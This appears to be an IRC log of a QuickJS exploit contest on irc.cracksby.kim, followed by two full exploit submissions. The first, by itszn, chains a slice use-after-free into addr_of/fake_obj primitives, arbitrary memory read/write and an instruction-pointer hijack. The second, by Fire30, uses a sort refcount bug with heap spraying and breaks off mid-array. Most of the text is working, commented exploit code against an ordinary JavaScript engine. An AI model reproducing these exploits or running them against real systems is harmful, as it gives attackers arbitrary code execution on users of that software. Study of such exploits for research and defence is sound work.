+[22:31:57]  Fire30:	https://pastebin.com/PF06fcc5 [1]
+[22:32:01]  Fire30:	gets you overlap
+[22:32:15]  Fire30:	I think I could plug it into my exploit :p 
+[22:33:03]  niklasb:	nice Fire30 
+[22:33:15]  littlelailo:	ok I would be ready to vote
+[22:34:42]  @qwertyoruiop:	you may cast your vote littlelailo
+[22:34:47]  itszn:	tbf the slice one was a little harder to exploit because it was reading JSValues, but it did lead to nice fake_obj addr_of with a little playing
+[22:36:42]  littlelailo:	I'll vote for the string one
+[22:37:06]  littlelailo:	because it's a bit more pretty than the weak map in my opinion and it's an uncommon js engine bug type
+[22:38:19]  bkth:	Yeah me too (not biased on his fuzzer at all no corruption there move alongside)
+[22:38:39]  bkth:	But honestly i would do too for the same reason as littlelailo
+[22:38:46]  bkth:	Array slide being buggy is so 2016 
+[22:38:49]  bkth:	Slice*
+[22:38:55]  bkth:	Waiting on max though 
+[22:39:48]  littlelailo:	well for me it's kinda too most of the current js engine bugs are in some array function
+[22:40:09]  littlelailo:	and the other reason was the bug type
+[22:47:42]  ~as:	alright im putting my vote down for niklasb's string double free, it is a really clean bug
+[23:15:15]  acez:	voting niklasb's string
+[23:18:13]  oned4:	voting niklasb's `JSObject double free` [edit: string]
+[23:43:26]  Fire30:	I also do the double deref niklas bug
+[00:16:49]  ~as:	qwertyoruiop the hours up, are ya calling it?
+[00:17:02]  itszn:	RIP mxms
+[00:17:05]  @qwertyoruiop:	yeah i mean
+[00:17:09]  @qwertyoruiop:	he kinda woke up
+[00:17:11]  @qwertyoruiop:	and never showed up
+[00:18:17]  ~as:	rip it might've been a cool bug 
+[00:19:11]  @qwertyoruiop:	for the jury's consideration, mxms's messages LEAKED
+[00:19:11]  @qwertyoruiop:	Not home yo :( 
+[00:19:11]  @qwertyoruiop:	Dealing with some shit m6
+[00:19:33]  @qwertyoruiop:	so i guess we can call niklasb's string bug the winner?
+[00:19:34]  niklasb:	just ask if it was the slice bug
+[00:19:37]  @qwertyoruiop:	yea
+[00:19:39]  @qwertyoruiop:	good point
+[00:19:39]  niklasb:	chances are high
+[00:19:44]  itszn:	LOL
+[00:19:54]  @qwertyoruiop:	it wasnt
+[00:20:02]  @qwertyoruiop:	<.<
+[00:20:20]  niklasb:	oh no
+[00:20:22]  Fire30:	Ask him what it was in
+[00:20:25]  Fire30:	We can go hunting
+[00:20:28]  Fire30:	Lol
+[00:20:29]  niklasb:	yeah 
+[00:21:05]  @qwertyoruiop:	yeah at the end of the day its all about putting moar bugs in the nfo
+[00:21:12]  niklasb:	exactly
+[00:21:53]  Fire30:	so what js engine are we doing next week :P
+[00:21:57]  @qwertyoruiop:	lmfaoi
+[00:22:07]  bkth:	    Hermes 
+[00:22:20]  @qwertyoruiop:	Month Of Random JS Engines
+[00:22:23]  @qwertyoruiop:	honestly i'd be down
+[00:22:24]  @qwertyoruiop:	lmao
+[00:22:39]  Fire30:	need to create a cracksby.kim cryptocurrency and that is the reward
+[00:22:50]  @qwertyoruiop:	lmao
+[00:22:53]  niklasb:	0DAY token
+[00:23:11]  niklasb:	it's backed by webkit 0day
+[00:23:13]  @qwertyoruiop:	where whitepaper @
+[00:23:19]  @qwertyoruiop:	we could all be millionaires
+[00:23:24]  @qwertyoruiop:	we just need a whitepaper
+[00:23:28]  itszn:	invest in the ico now
+[00:25:21]  @qwertyoruiop:	ok
+[00:25:24]  @qwertyoruiop:	got intel from mxms
+[00:25:27]  @qwertyoruiop:	string concat refcounting
+[00:25:37]  littlelailo:	oh that's a new one
+[00:25:41]  niklasb:	I mean
+[00:25:44]  niklasb:	could be the same honestky
+[00:25:47]  niklasb:	honestly
+[00:25:52]  littlelailo:	yeah true
+[00:25:59]  @qwertyoruiop:	i dunno
+[00:26:04]  littlelailo:	sry bit tired
+[00:26:26]  @qwertyoruiop:	    /* XXX: This method is OK if r has a single refcount */
+[00:26:26]  @qwertyoruiop:	    /* XXX: should use string_buffer? */
+[00:26:38]  ~as:	lol
+[00:27:01]  littlelailo:	yeah just search for XXX to find bugs
+[00:29:05]  @qwertyoruiop:	ok can the jury agree niklasb won the bug category
+[00:29:25]  Fire30:	yeah 
+[00:29:25]  littlelailo:	yeh from my side
+[00:29:29]  Fire30:	might be JS_ConcatString3
+[00:29:35]  @qwertyoruiop:	and that mxms gets a passive aggressive message (as in this one) in the nfo
+[00:29:41]  Fire30:	similar to the sort
+[00:29:43]  niklasb:	\o/
+[00:30:54]  @qwertyoruiop:	niklasb won
+[00:31:05]  @qwertyoruiop:	now for exploit category
+[00:31:10]  @qwertyoruiop:	we have two contestants, itszn and Fire30 
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀The winner of the bug category was hereby declared to be niklasb.
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Submissions for exploit category (in chronological order of hash proof / submission):
+
+By @itszn13:
+
+/*
+ * This exploit is targeting linux, tested on ubuntu 18.04
+ * Techniques should generally work on other OSs but I don't have any to test easily
+ */
+// Debugging functions
+if (this.debug === undefined)
+  this.debug = ()=>{}
+if (this.cc === undefined)
+  this.cc = ()=>{}
+
+let gprint = (x) => { print("\x1b[92m"+x+"\x1b[0m") }
+let bprint = (x) => { print("\x1b[91m"+x+"\x1b[0m") }
+
+// Binary helper functions
+var Binary = (function() {
+  let memory = new ArrayBuffer(8);
+  let view_u8 = new Uint8Array(memory);
+  let view_u32 = new Uint32Array(memory);
+  let view_f64 = new Float64Array(memory);
+
+  return {
+    view_u8: view_u8,
+    view_u32: view_u32,
+    view_f64: view_f64,
+
+    i64_to_f64: (i64) => {
+      view_u32[0] = i64.low;
+      view_u32[1] = i64.high;
+      return view_f64[0];
+    },
+    f64_to_i64: (f) => {
+      view_f64[0] = f;
+      return new Int64(view_u32[1], view_u32[0]);
+    },
+
+    i32_to_u32: (i32) => {
+      // needed because 0xffffffff -> -1 as an int
+      view_u32[0] = i32;
+      return view_u32[0];
+    },
+    i64_to_str: (i64) => {
+      view_u32[0] = i64.low;
+      view_u32[1] = i64.high;
+      return String.fromCharCode.apply(null, view_u8);
+    },
+    i32_to_str: (i64) => {
+      if (i64.low)
+        view_u32[0] = i64.low;
+      else
+        view_u32[0] = i64;
+      return String.fromCharCode.apply(null, view_u8).slice(0,4)
+    },
+    i64_from_buffer: (buff, len=8) => {
+        let conv_buff;
+        if (buff.BYTES_PER_ELEMENT === 1)
+            conv_buff = view_u8;
+        else if (buff.BYTES_PER_ELEMENT === 4)
+            conv_buff = view_u32;
+        else if (buff.BYTES_PER_ELEMENT === 8)
+            conv_buff = view_f64;
+        // Copy bytes
+        view_u32[0] = 0;
+        view_u32[1] = 0;
+        for (let i=0; i<len/buff.BYTES_PER_ELEMENT; i++) {
+            conv_buff[i] = buff[i];
+        }
+        return new Int64(view_u32[1], view_u32[0]);
+    },
+    store_i64_in_buffer: (i64, buff, len=8, offset=0) => {
+        if (i64.low) { 
+          view_u32[0] = i64.low;
+          view_u32[1] = i64.high;
+        } else {
+          view_u32[0] = i64;
+          view_u32[1] = 0
+        }
+
+        let conv_buff;
+        if (buff.BYTES_PER_ELEMENT === 1)
+            conv_buff = view_u8;
+        else if (buff.BYTES_PER_ELEMENT === 4)
+            conv_buff = view_u32;
+        else if (buff.BYTES_PER_ELEMENT === 8)
+            conv_buff = view_f64;
+
+        // Copy bytes
+        for (let i=0; i<len/buff.BYTES_PER_ELEMENT; i++) {
+            buff[i] = conv_buff[i];
+        }
+    }
+  }
+})();
+
+
+
+// Simple Int64 class
+class Int64 { 
+  constructor(high, low) {
+    if (low === undefined) {
+      this.high = 0;
+      this.low = high;
+    } else {
+      this.high = high;
+      this.low = low;
+    }
+  }
+  toString() {
+    // Return as hex string
+    return '0x'+Binary.i32_to_u32(this.high)
+        .toString(16).padStart(8,'0') +
+    Binary.i32_to_u32(this.low)
+        .toString(16).padStart(8,'0');
+  }
+  _add_inplace(high, low) {
+    let tmp = Binary.i32_to_u32(this.low) + Binary.i32_to_u32(low);
+    this.low = tmp & 0xffffffff;
+    let carry = (tmp > 0xffffffff)|0;
+    this.high = (this.high + high + carry) & 0xffffffff;
+    return this;
+  }
+  add_inplace(v) {
+    if (v instanceof Int64)
+      return this._add_inplace(v.high, v.low);
+    return this._add_inplace(0, v);
+  }
+  add(v) {
+    let res = new Int64(this.high, this.low);
+    return res.add_inplace(v);
+  }
+  _sub_inplace(high, low) {
+    // Add with two's compliment
+    this._add_inplace(~high, ~low)._add_inplace(0, 1);
+    return this
+  }
+  sub_inplace(v) {
+    if (v instanceof Int64)
+      return this._sub_inplace(v.high, v.low);
+    return this._sub_inplace(0, v);
+  }
+  sub(v) {
+    let res = new Int64(this.high, this.low);
+    return res.sub_inplace(v);
+  }
+}
+
+/* ------ Exploit start ------- */
+
+// This is the size of the backing data of the array buffer we use for the UAF later
+let SIZE = 0x800;
+
+let some_obj;
+
+/*
+ * The bug here is a UAF in array.p.split:
+ *      1. Override the constructor for an array with a hook to Symbol.species
+ *         This will get called during the split when a new array is created
+ *      2. Symbol.species should return a Proxy with defineProperty hooked
+ *      3. During the slice fast path there is a loop 
+ *
+ *           for (; k < final && k < count32; k++, n++) {
+ *             ... JS_CreateDataPropertyUint32(ctx, arr, n, JS_DupValue(ctx, arrp[k]), ...) ...
+ *
+ *         This will trigger defineProperty during the fast path loop
+ *      5. Change the array to be property elements, this will free the arrp ptr
+ *      6. The loop still uses this pointer causing a UAF
+ */
+
+
+let is_64 = null;
+function hack(size, action, start, end) {
+  // Allocate a backing array for given size
+  let t = new Array(size);
+  // Fill with tagged floats (important for 64bit)
+  t.fill(1.1);
+
+  t.constructor = {[Symbol.species]: function () {
+    let evil = new Proxy({}, {
+      defineProperty(x, key, desc) {
+        if (key === '0') {
+          // Change the array to have property elements
+          t[1000] = 1;
+
+          // t.u.array.values is now free'd but split will keep using it
+        }
+        action(key, desc);
+        return true;
+      }
+    });
+    return evil;
+  }};
+
+  // Trigger bug
+  let o = t.slice(start, end);
+}
+
+
+let nop = {set: function(){}};
+
+// Fill in some potential holes in the heap
+let save = new Array(100);
+for (let i=0; i<100; i++) {
+  save[i] = [1,2];
+}
+
+/*
+ * We need to tell if we are running 32 bit or 64 bit
+ * 
+ * This can be done by using the bug to UAF with a property array
+ * JSPropertys can either be JSValues or getter/setter pair
+ *
+ * Reading the getter/setter as a JSValue depends on NaN-Boxing or not
+ * - On 32 bit we get a float because large tags means NaN-boxed float
+ * - On 64 bit we get a bad object because large tags are invalid
+ */
+hack(0x2, function(key, desc) {
+    if (key === '0') {
+        some_obj= {a:1};
+        Object.defineProperty(some_obj, 'b', nop);
+    } else if (key === '1') {
+        is_64 = typeof(desc.value) == 'unknown'
+    }
+}, 0, 2);
+
+
+if (is_64)
+    print("[+] We are on 64 bit system!")
+else
+    print("[+] We are on 32 bit system!")
+
+let fake_obj_holder;
+let prop_arr_leak = new Int64(0);
+
+// Fake string
+// For 32 bits we have to NaN-box the top to a kind large size
+let string_header = Binary.i64_to_f64(new Int64(is_64? 8 : 0x80000013, 0xffff));
+
+let some_array;
+let upper_heap_addr;
+
+if (is_64) {
+  /*
+   * Since we have to use a tagged int to leak the property array, we are
+   * missing 2 bytes of the pointer. To leak these bytes we will use the UAF and
+   * uninitialized memory
+   *
+   * The JSArrayBuffer pointer of the ArrayBuffer object can be accessed as
+   * a JSValue using an uninitialized 7
+   *
+   * --=== UAF Memory ===--
+   * [  flags  ] [  link1  ]
+   * [  link2  ] [  shape  ]
+   * [  props  ] [  wkref  ]
+   * [  arrbf  ] <    7    >  <--- Read as JSValue (Ta
+   */
+  hack(4, function(key, desc) {
+    if (key === '0') {
+      // ArrayBuffer to leak
+      some_array = new ArrayBuffer(1);
+    }
+    if (key === '1') {
+      Binary.view_f64[0] = desc.value;
+      upper_heap_addr = Binary.view_u32[1];
+      prop_arr_leak.high = upper_heap_addr;
+      print("[+] JSArrayBuffer>>32 == 0x"+upper_heap_addr.toString(16));
+    }
+  }, 2,4);
+}
+
+/*
+ * The goal of the first stage is to leak a pointer to a set of jsvalues
+ *
+ * On 64 bits, we do this by leaking a property pointer. Since the first_weak_ref
+ *   will be zero (int tag) we can just read it as a tagged integer
+ *
+ * --=== UAF Memory ===--
+ * [  flags  ] [  link1  ]
+ * [  link2  ] [  shape  ]
+ * [  props  ] [    0    ]  <--- Read as JSValue (Tagged Int)
+ *
+ * On 32 bits, we do this by leaking the array values pointer
+ *   When we read it as a JSValue, the element count will be the tag, so we have
+ *   to make sure the element count will give us a valid NaN-boxed float
+ *
+ *   The smallest size we can do is 0x80000 elements
+ *
+ * --=== UAF Memory ===--
+ * [  flags  ] [  flags  ]
+ * [  link1  ] [  link2  ]
+ * [  shape  ] [  props  ]
+ * [  wkref  ] [  asize  ]
+ * [  avals  ] [ 0x80000 ] <--- Read as JSValue (NaN-Boxed Float64)
+ * 
+ */
+
+hack(is_64? 0x4 : 0x5, function(key, desc) {
+    if (key === '0') {
+        // Allocate object in UAF memory
+        // This is set up for a fake string object we will fake_obj later
+        if (is_64) {
+          fake_obj_holder = {
+              a:string_header,
+              b:0x41424344,
+              c:1
+          };
+        } else {
+            fake_obj_holder = [1];
+            fake_obj_holder.length = 0x80000;
+            fake_obj_holder.fill(0);
+            fake_obj_holder[0] = string_header;
+            fake_obj_holder[2] =0x41424344; 
+        }
+
+    } else if (key === '1') {
+        if (is_64) {
+            // Now we read the property array pointer from confused object
+            prop_arr_leak.low = desc.value;
+        } else {
+            // We can now grab the value from our float
+            Binary.view_f64[0] = desc.value;
+            prop_arr_leak.low = Binary.view_u32[0];
+        }
+
+        print("[+] property array @ "+ prop_arr_leak.toString(16));
+        if (prop_arr_leak.low === 0) {
+            bprint("Failed to get property array")
+            throw("Failed");
+        }
+    }
+}, is_64? 1 : 3, is_64? 3 : 5);
+
+// Used later for better fake_obj/addr_of later on
+let real_jsvalue_array = [1,1];
+
+let confused_buffer;
+let confused_buffer_accessor;
+let fake_string;
+let fake_array;
+
+let fake_obj_offset;
+let fake_array_data;
+
+let primitives = {};
+
+        
+/*
+ * The goal of the second stage is to replace the UAF with typed array memory.
+ * This will allow us to write arbitrary JSValues and get a fake_obj
+ *
+ * However we can only trigger this fake_obj during the slice callbacks, so we
+ * will create a fake JSString and a fake JSArray to create stable addr_of and fake_obj
+ */
+hack(is_64? SIZE/0x10 : SIZE/8, function(key, desc) {
+    if (key === '0') {
+        // Allocate the arraybuffer so we can control data in the UAF
+        confused_buffer = new ArrayBuffer(SIZE);
+        confused_buffer_accessor = new DataView(confused_buffer);
+
+        // Write indexes into the buffer so we can see how far we are accessing
+        for (let i=0; i<SIZE; i+=(is_64? 16 : 8)) {
+            confused_buffer_accessor.setInt32(i, i, true);
+        }
+    } else if (key === '1') {
+        // Find what offset into the buffer we are accessing
+        fake_obj_offset = desc.value;
+        print("[+] found offset in ArrayBuffer: " + fake_obj_offset + "\x1b[0m");
+
+        /*
+         * The next access will read the following memory we write as a JSValue
+         *
+         * This lets us create a fake string within the fake_obj_holder object
+         * we previous leaked the array/properties of
+         */
+
+        fake_obj_offset += is_64? 16 : 8;
+        
+        // Write the pointer to the JSValues we control in fake_obj_holder
+        confused_buffer_accessor.setUint32(fake_obj_offset, prop_arr_leak.low, true);
+        if (is_64)
+          confused_buffer_accessor.setUint32(fake_obj_offset+4,
+                                             prop_arr_leak.high, true);
+        // Set the JSValue tag to be -7 for a tagged string
+        confused_buffer_accessor.setInt32(fake_obj_offset + (is_64? 8 : 4), -7, true);
+    } else if (key === '2') {
+
+      /*
+       * Now that we have created the fake string we can use it to read other JSValues
+       * within the fake_obj_holder object. This will let us create addr_of by leaking
+       * the tagged pointer values using the fake_string
+       */
+
+      fake_string = desc.value;
+
+      primitives.addr_of = function(jsvalue) {
+        if (is_64) {
+          fake_obj_holder.b = jsvalue;
+        } else {
+          fake_obj_holder[2] = jsvalue;
+        }
+        for(let i=0; i< (is_64 ? 8 : 4); i++) {
+          Binary.view_u8[i] = fake_string.charCodeAt(i);
+        }
+        return new Int64(is_64 ? Binary.view_u32[1] : 0, Binary.view_u32[0]);
+      }
+
+      /*
+       * At this point we want a better fake_obj as this one only works during the slice
+       *
+       * In 64 bits we can do this by making a fake array, which points offset to a real
+       * set of JSValues
+       * 
+       *      real JSArray  ->  [  value  ][   tag   ][  value  ][   tag   ]
+       *      fake JSArray  ->             [  value  ][   tag   ]           
+       *
+       * This will give us fake_obj this way:
+       * 1. Write address as tagged float to real[0] (real[0] tag will now be 7)
+       * 2. Write -1 as tagged int to fake[0] (real[0] tag will now be -1)
+       * 3. Read real[0] as JSObject
+       * 4. Write 7 as tagged int to fake[0] to fix up memory
+       *
+       * We are creating the fake object data in a string since it is easy to addr_of
+       */
+      if (is_64) {
+        fake_array_data = 
+"\xff\xff\0\0\
+\0\x0d\
+\x02\x00\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\x01\0\0\0\0\0\0\0" +
+Binary.i64_to_str(prop_arr_leak.add_inplace(0x18)) +
+"\x01\0\0\0\0\0\0\0";
+      } else {
+        fake_array_data = 
+"\xff\xff\0\0\
+\0\x0d\
+\x02\x00\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\x01\0\0\0" +
+Binary.i32_to_str(prop_arr_leak.add_inplace(0x14)) +
+"\x01\0\0\0";
+      }
+      let addr = primitives.addr_of(fake_array_data).add_inplace(0x10);
+      print("[+] fake_array_data @ "+addr.toString(16));
+
+      fake_obj_offset += is_64? 16 : 8;
+      confused_buffer_accessor.setUint32(fake_obj_offset, addr.low, true);
+      if (is_64) {
+        confused_buffer_accessor.setUint32(fake_obj_offset + 4, addr.high, true);
+      }
+      confused_buffer_accessor.setInt32(fake_obj_offset + (is_64? 8 : 4), -1, true);
+
+    } else if (key === '3') {
+        // We now have our fake array, so we can build fake_obj as described above
+        fake_array = desc.value;
+        if (is_64) {
+            primitives.fake_obj = function(addr) {
+                // Write as tagged float (tag 7)
+                fake_obj_holder.b = Binary.i64_to_f64(addr);
+
+                // Set tag to -1
+                fake_array[0] = -1|0;
+
+                // Read as tagged object
+                let obj = fake_obj_holder.b;
+
+                // Fix tag
+                fake_array[0] = 7|0;
+                return obj;
+            }
+        } else {
+            primitives.fake_obj = function(addr) {
+                // Write as tagged int (tag 0)
+                fake_obj_holder[2] = addr.low;
+
+                // Set tag to -1
+                fake_array[0] = -1|0;
+
+                // Read as tagged object
+                let obj = fake_obj_holder[2];
+
+                // Fix tag
+                fake_array[0] = 0|0;
+                return obj;
+            }
+        }
+    }
+}, 20, 20+4);
+
+let sanity1 = function() {
+    let x = {x:1337};
+
+    let addr = primitives.addr_of(x)
+
+    let y = primitives.fake_obj(addr);
+    if (y.x !== 1337) {
+        bprint("Failed to get addr_of/fake_obj")
+        throw("Failed");
+    }
+}
+
+sanity1();
+gprint("[+] fake_obj / addr_of all good");
+
+/*
+ * To get arbitrary read/write we can make a fake Uint32Array
+ * The only field we need to set is u.array.u.ptr and u.array.count
+ * So its easy to just do this with fake_obj
+ *
+ * We will point this fake Uint32Array at a real Uint32Array to
+ * make it easy to modify u.array.u.ptr
+ */
+
+let real_array_buffer = new Uint8Array(0x1000);
+
+let real_array_buffer_ptr = primitives.addr_of(real_array_buffer);
+print("[+] real_array_buffer @ "+real_array_buffer_ptr.toString(16));
+
+let fake_typed_array_data;
+if (is_64) {
+    fake_typed_array_data = 
+"\xff\xff\0\0\
+\0\x0d\
+\x1b\x00\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0\
+\0\0\0\0\0\0\0\0" +
+Binary.i64_to_str(real_array_buffer_ptr) +
+"\0\0\x01\0\0\0\0\0";
+} else {
+    fake_typed_array_data = 
+"\xff\xff\0\0\
+\0\x0d\
+\x1b\x00\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0\
+\0\0\0\0" +
+Binary.i32_to_str(real_array_buffer_ptr) +
+"\0\0\x01\0";
+}
+
+let fake_typed_array_data_ptr = primitives.addr_of(fake_typed_array_data).add_inplace(0x10);
+print("[+] fake_typed_array_data @ "+fake_typed_array_data_ptr.toString(16));
+
+let fake_array_buffer = primitives.fake_obj(fake_typed_array_data_ptr);
+
+primitives.set_addr = function(addr, val) {
+    if (is_64) {
+        fake_array_buffer[14] = addr.low;
+        fake_array_buffer[15] = addr.high;
+    } else {
+        fake_array_buffer[8] = addr.low? addr.low : addr;
+    }
+}
+primitives.read_64 = function(addr) {
+    primitives.set_addr(addr);
+    return Binary.i64_from_buffer(real_array_buffer);
+}
+primitives.read_32 = function(addr) {
+    primitives.set_addr(addr);
+    return Binary.i64_from_buffer(real_array_buffer, 4);
+}
+primitives.write_64 = function(addr, val) {
+    primitives.set_addr(addr);
+    Binary.store_i64_in_buffer(val, real_array_buffer);
+}
+primitives.write_32 = function(addr, val) {
+    primitives.set_addr(addr);
+    Binary.store_i64_in_buffer(val, real_array_buffer, 4);
+}
+primitives.read_ptr = function(addr) {
+  if (is_64) return primitives.read_64(addr);
+  return primitives.read_32(addr);
+}
+primitives.write_ptr = function(addr, value) {
+  if (is_64) return primitives.write_64(addr, value);
+  return primitives.write_32(addr, value);
+}
+
+let sanity2 = function() {
+    let x = new Uint32Array(8);
+    x[0] = 0x41424344;
+    let addr = primitives.addr_of(x);
+    if (is_64) {
+        let data = primitives.read_ptr(addr.add_inplace(0x38));
+        primitives.write_32(data, 0x51525354);
+    } else {
+        let data = primitives.read_ptr(addr.add_inplace(0x20));
+        primitives.write_32(data, 0x51525354);
+    }
+    if (x[0] != 0x51525354){
+        bprint("Failed to get arb read/write")
+        throw("Failed")
+    }
+}
+
+sanity2();
+gprint("[+] Arbitrary Read/Write working!");
+
+let print_ptr = primitives.addr_of(print)
+print_ptr.add_inplace(is_64 ? 0x30 : 0x1c);
+let print_code_ptr = primitives.read_ptr(print_ptr);
+print("[+] print @ "+print_code_ptr);
+
+gprint(`[+] Ok going to hijack ${is_64? 'RIP':'EIP'} now because why now`);
+primitives.write_ptr(print_ptr, 0x41424344);
+print("bye bye");
+
+
+========================================== snip ============================================
+
+
+@Fire30's submission:
+
+
+/*
+ * Exploit submission for Fire30 in irc.cracksby.kim #chat quickjs exploit contest.
+ *
+ * The exploit uses the bug from http://rce.party/qjs.js and is 64 bit only.
+ * Also only tested on Linux.
+ *
+ * The exploit strategy is as follows:
+ * - Spray a bunch of typed array buffers and then create holes
+ * - Allocate the target object in one of the holes
+ * - Trigger the bug. It essentially gives us a primitive where we can free the
+  target while still holding a reference somewhere else, allowing us to cause
+  type confusions
+ * - Free and refill the target with a JSString, then free again using second
+ * reference and refill with JSObject.
+ * - Read from the JSString allowing us to leak various information of the object
+ * most importantly the values field.
+ * - Free the JSString and replace it with typed array data
+ * - Craft a fake JSObject using the leaked data with a values address
+ incremented by 0x2000 as that will point into the spray buffers
+ * - Figure out where exactly in the spray buffers the values address is
+ * - fakeobj = write to spray buffer read from crafted array
+ * - addrof = write to crafted array read from spray buffer
+ * - Using addrof find address of two Uint32Arrays(master, slave)
+ * - Make our crafted JSObject values point to master
+ * - Write slave to master->values using crafted array
+ * - arb read/write = write address to master, read/write from/to slave
+ * - code exec is overwriting parseFloat. Taken from http://rce.party/qjs-rip.js
+ */
+
+
+// Helper functions for working with 64 bit addresses
+function toint64(low, high) {
+    return low + high * 0x100000000;
+}
+
+function fromint64(val) {
+    return [val & 0xffffffff, val / 0x100000000];
+}
+
+// Global variables we are using
+var a;
+var refcopy;
+var refill_0;
+var refill_1;
+
+var spray;
+
+var jsobj_leak_data;
+
+var x;
+var y;
+
+var master;
+var slave;
+var master_addr;
+var slave_addr;
+
+var test;
+var test_addr;
+var fake_test;
+var test_values;
+var test_values_read;
+
+spray = [];
+
+jsobj_leak_data = new Uint32Array(0x38);
+jsobj_leak_data.fill(0);
+
+// .slice will allocate a new JSString
+x = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
+y = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
+
+master = new Uint32Array(0x40);
+master.fill(0x31313131);
+
+slave = new Uint32Array(0x40);
+slave.fill(0x61616161);
+
+test = [0x1337];
+
+print("starting exploit");
+print("spraying buffers");
+for (var i = 0; i < 0x400; i++) {
+    var x = new Uint32Array(0x1000 / 4);
+    x.fill(0x51515151);
+    spray.push(x);
+}
+print("creating holes");
+for (var i = 0; i < spray.length; i += 0x4) {
+    spray[i] = 0;
+}
+print("placing target");
+a = [
+    [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    ], 1, 2, 3, 4
+];
+
+print("grabbing reference to target");
+refcopy = a[0];
+
+print("triggering bug");
+a.__defineSetter__(3, function () {
+    throw 1;
+});
+try {
+    a.sort(function (v) {
+        return 0;
+    });
+} catch (e) {}
+
+print("freeing target twice and overlaping JSString and JSObject");
+a[0] = 0x61616161;
+refill_0 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
+refcopy = 0;
+
+refill_1 = [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
